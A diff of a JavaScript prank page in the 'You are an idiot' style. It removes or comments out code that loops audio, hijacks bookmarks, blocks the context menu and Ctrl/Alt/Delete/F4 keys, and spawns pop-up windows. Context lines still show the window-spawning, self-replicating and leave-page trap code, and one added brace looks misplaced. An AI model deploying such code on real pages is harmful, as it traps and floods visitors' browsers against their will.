@@ -1,50 +1,3 @@
-document.addEventListener('click', musicPlay);
-
-function musicPlay() {
-    var audio = document.getElementById('youare-audio');
-    var micon = document.getElementById('youare-micon');
-
-    micon.addEventListener('click', musicPlay);
-
-    if (audio.duration > 0 && audio.paused) {
-        audio.play();
-        micon.src = "images/speaker.png";
-    } else {
-        audio.pause();
-        audio.currentTime = 0;
-
-        micon.src = "images/speakerm.png";
-    }
-
-    document.removeEventListener('click', musicPlay);
-}
-
-var faudio = new Audio('youare.mp3');
-
-faudio.addEventListener('timeupdate', function () {
-    console.log('TimeUpdate invoked.');
-
-    if (this.currentTime > this.duration - 0.45) {
-        this.currentTime = 0;
-        this.play();
-    }
-});
-
-function bookmark() {
-    if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-        var url = "lol.html";
-        var title = "Idiot!";
-
-        window.external.AddFavorite(url, title);
-    }
-}
-
-function changeTitle(title) {
-    document.title = title;
-}
-
-
-
 function openWindow(url) {
     var newWin = window.open("", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
 
@@ -89,21 +42,6 @@ function proCreate() {
         }
     }, 100); // Adjust delay as needed
 }
-
-window.oncontextmenu = function () {
-    return false;
-};
-
-window.onkeydown = function () {
-    var keyCode = event.keyCode;
-
-    if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {
-        alert("You are an idiot!");
-        proCreate();
-    }
-
-    return null;
-};
 
 window.onbeforeunload = function () {
     return "Are you an idiot?";
@@ -176,7 +114,7 @@ function startChaos() {
             newWin.document.close();
         }
     }
-
+}
     // Start with a few windows
     /*for (let i = 0; i < 3; i++) {
         openSelfReplicatingWindow();
@@ -188,6 +126,7 @@ window.onload = requestPopUpPermission;
 
 
 // Self-executing function to start immediately
-(function () {
+/*(function () {
         proCreate();
 })();
+*/
